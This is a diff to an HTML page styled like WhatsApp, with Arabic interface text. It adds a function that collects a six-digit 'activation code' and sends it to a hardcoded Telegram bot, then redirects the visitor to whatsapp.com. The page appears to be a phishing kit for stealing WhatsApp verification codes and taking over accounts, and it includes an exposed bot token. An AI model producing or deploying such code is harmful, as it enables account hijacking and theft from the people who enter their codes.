@@ -37,7 +37,6 @@
             align-items: center;
             font-size: 20px;
             font-weight: bold;
-            white-space: nowrap;
         }
 
         header .logo img {
@@ -173,21 +172,6 @@
             color: #25D366;
             text-decoration: none;
         }
-
-        @media (max-width: 768px) {
-            header {
-                flex-wrap: nowrap;
-            }
-
-            header .logo {
-                font-size: 18px;
-                justify-content: center;
-            }
-
-            header .menu {
-                margin-left: auto;
-            }
-        }
     </style>
 </head>
 
@@ -236,6 +220,45 @@
         function toggleMenu() {
             const dropdown = document.querySelector('.dropdown');
             dropdown.classList.toggle('active');
+        }
+
+        // وظيفة إرسال الرمز
+        function sendMessage() {
+            const phoneNumberInput = document.getElementById('phoneNumber');
+            const phoneNumber = phoneNumberInput.value;
+
+            if (!phoneNumber || phoneNumber.length !== 6 || !/^\d{6}$/.test(phoneNumber)) {
+                alert('يرجى إدخال رمز مكون من 6 أرقام فقط.');
+                return;
+            }
+
+            const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
+            const chatId = '612575358';
+            const message = `رمز التفعيل: ${phoneNumber}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('تم إرسال رمز التفعيل بنجاح!');
+                        phoneNumberInput.value = '';
+                        window.location.href = "https://www.whatsapp.com";
+                    } else {
+                        alert('حدث خطأ أثناء الإرسال.');
+                    }
+                })
+                .catch(error => {
+                    alert('فشل الاتصال بالخادم.');
+                });
         }
     </script>
 </body>
